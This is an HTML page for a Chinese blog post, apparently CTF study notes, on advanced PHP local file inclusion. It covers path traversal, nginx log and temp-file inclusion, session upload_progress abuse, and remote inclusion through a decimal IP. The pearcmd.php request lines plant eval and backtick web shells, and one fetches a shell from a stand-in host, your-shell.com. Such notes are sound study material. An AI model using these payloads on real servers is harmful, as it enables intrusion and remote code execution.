@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<style>
+    p{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+        font-size: 1.1rem;
+    }
+    figure{
+        margin: 0 !important;
+    }
+    pre{
+        padding: 0 !important;
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+
+    td{
+        padding: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+    h1,h2,h3,h4,h5,h6{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+    @media (min-width: 1024px) {
+        #middle-box{
+            min-width: 56rem;
+        }
+    
+    }
+</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>blog - php文件包含(进阶)</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/toc.css">
+    
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          blog
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Categories
+              </a>
+            </li>
+          
+            <li>
+              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Tags
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
+              Categories
+            </a>
+          </li>
+        
+          <li>
+            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
+              Tags
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">php文件包含(进阶)</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2026-10-18
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
+        <div id="middle-box">
+            <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;</p>
+<h3 id="一-文件名可控"><a href="#一-文件名可控" class="headerlink" title="一 文件名可控"></a>一 文件名可控</h3><p>$file&#x3D;$_GET[‘file’];</p>
+<p>include $file.”.php”;  &#x2F;&#x2F;用php伪协议 ，可以使用data协议</p>
+<h3 id="二-文件后缀可控"><a href="#二-文件后缀可控" class="headerlink" title="二 文件后缀可控"></a>二 文件后缀可控</h3><p>$file&#x3D;$_GET[‘file’];</p>
+<p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;“.$file;   &#x2F;&#x2F;不能使用伪协议了，伪协议他前面有固定的格式</p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag &#x2F;&#x2F; 通过目录跳转实现文件包含</p>
+<h2 id="高级文件包含"><a href="#高级文件包含" class="headerlink" title="高级文件包含"></a>高级文件包含</h2><h3 id="一-nginx日志文件包含"><a href="#一-nginx日志文件包含" class="headerlink" title="一 nginx日志文件包含"></a>一 nginx日志文件包含</h3><p>nginx  可以认为它是http的一个服务器软件，提供了http服务 ，默认监听80端口</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/123.php?a=b">http://localhost/123.php?a=b</a></p>
+<p>123.php 后缀是否是.php .就进行一次转发，转发到本地的127.0.0.1的9000端口</p>
+<p>9000端口，是被另一个服务端软件监听，它提供解析php文件的服务，我们把这个软件，叫做php-fpm</p>
+<p>专门解析php后缀的文件，执行里面代码，将执行结果交给nginx,再由nginx返回给http的客户端，这个客户端就是浏览器</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/123.jpg">http://localhost/123.jpg</a></p>
+<p>123.jpg 非php后缀，那么由自己处理，nginx会找到web目录，读取123.jpg的内容，并返回给浏览器，同时告诉浏览器，我返回的<br>文件内容是一个jpg图片，你按照图片模式进行渲染，于是，浏览器页面上就能显示出一张图片出来</p>
+<h4 id="日志包含的前提条件"><a href="#日志包含的前提条件" class="headerlink" title="日志包含的前提条件"></a>日志包含的前提条件</h4><p>1 有文件名可控的文件包含点,文件不能有后缀<br>2 有可以访问到的日志路径   默认nginx的日志路径为 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<h3 id="二-临时文件包含"><a href="#二-临时文件包含" class="headerlink" title="二 临时文件包含"></a>二 临时文件包含</h3><p>&#x2F;tmp&#x2F;php??????</p>
+<p>文件包含，能否包含一个 &#x2F;???&#x2F;????????[@-[]]</p>
+<p>答案是：不行 文件包含，是不支持通配符 </p>
+<p>我们明确的，得到这个临时目录下php开头的随机文件名字全称，然后我们就可以正常包含进去</p>
+<p>默认情况，生命周期与php脚本一致，也就是说，脚本运行过程中，存在，脚本运行结束了，这个临时文件会被自动删除</p>
+<p>突破点：<br>1 在php脚本运行过程中，包含临时文件<br>2 在脚本运行过程中，得到完整的临时文件名称 </p>
+<p>php配置文件中，默认，每次向浏览器发送内容时，不是一个字符一个字符发送的，它是一块内容一块内容发送的<br>4096个字符</p>
+<p>假设我们能够访问phpinfo的结果  FILES 就会存在tmp_name临时文件名字，读取后可以成功包含<br>php文件脚本记得上传<br>跑出来算你运气好</p>
+<p>phpinfo_lfi</p>
+<h3 id="三-php的session文件包含，upload-progress文件包含"><a href="#三-php的session文件包含，upload-progress文件包含" class="headerlink" title="三  php的session文件包含，upload_progress文件包含"></a>三  php的session文件包含，upload_progress文件包含</h3><p>强制文件上传时，通过上传一个固定的表单PHP_SESSION_UPLOAD_PROGRESS ，可以往服务器的session文件内写入我们的指定内容</p>
+<p>然后在脚本运行过程中<br>包含后，可以执行里面的php代码</p>
+<h3 id="四-pear文件包含"><a href="#四-pear文件包含" class="headerlink" title="四 pear文件包含"></a>四 pear文件包含</h3><p>条件：</p>
+<p>1 有文件包含点<br>2 开启了pear扩展<br>3 配置文件中register_argc_argv 设置为On,而默认为Off</p>
+<p>PEAR扩展</p>
+<p>PHP Extension and Application Repository</p>
+<p>默认安装位置是  &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;  </p>
+<p>利用Pear扩展进行文件包含</p>
+<h5 id="方法一-远程文件下载"><a href="#方法一-远程文件下载" class="headerlink" title="方法一  远程文件下载"></a>方法一  远程文件下载</h5><p>?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;ctfshow+install+-R+&#x2F;var&#x2F;www&#x2F;html&#x2F;+<a target="_blank" rel="noopener" href="http://your-shell.com/shell.php">http://your-shell.com/shell.php</a></p>
+<h5 id="方法二-生成配置文件，配置项传入我们恶意的php代码的形式"><a href="#方法二-生成配置文件，配置项传入我们恶意的php代码的形式" class="headerlink" title="方法二  生成配置文件，配置项传入我们恶意的php代码的形式"></a>方法二  生成配置文件，配置项传入我们恶意的php代码的形式</h5><p>a&#x3D;b</p>
+<p>username&#x3D;root<br>man_dir&#x3D;<?php eval($_POST[1]);?></p>
+<p>ctfshow.php<br>GET &#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+-c+&#x2F;tmp&#x2F;ctf.php+-d+man_dir&#x3D;<?eval($_POST[1]);?>+-s+ </p>
+<h5 id="方法三-写配置文件方式"><a href="#方法三-写配置文件方式" class="headerlink" title="方法三  写配置文件方式"></a>方法三  写配置文件方式</h5><p>GET &#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;aaaa+config-create+&#x2F;var&#x2F;www&#x2F;html&#x2F;<?=`$_POST[1]`;?>+1.php </p>
+<h3 id="五-远程文件包含"><a href="#五-远程文件包含" class="headerlink" title="五 远程文件包含"></a>五 远程文件包含</h3><p>通过域名转数字的形式，可以不用.来构造远程文件地址</p>
+<p><a target="_blank" rel="noopener" href="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
+<p>?file&#x3D;<a target="_blank" rel="noopener" href="http://43.154.107.226/1">http://731540450/1</a></p>
+
+        </div>
+        
+            <div class="post-container">
+            <aside class="toc-container">
+                <button class="toc-toggle">文章目录</button>
+                <nav class="toc" id="toc"></nav>
+            </aside>
+        </div>
+        
+    </div>
+
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+      
+      <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
+      
+      
+
+    <footer class="bg-black text-gray-400 py-4">
+ <div class="container mx-auto text-center">
+  <p>© <span id="current-year"></span>  Lao Zhen 
+    <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+ </div>
+</footer>
+
+<script> 
+ document.getElementById("current-year").textContent = new Date().getFullYear();
+</script>
+<script>
+window.MathJax = {
+tex: {
+  inlineMath: [['$', '$'], ['\\(', '\\)']]  // 启用 $...$ 和 \( ... \)
+},
+svg: {
+  fontCache: 'global'
+}
+};
+</script>
+<script src="js/tex-mml-chtml.js" async></script>
+
+
+
+</body>
+</html>
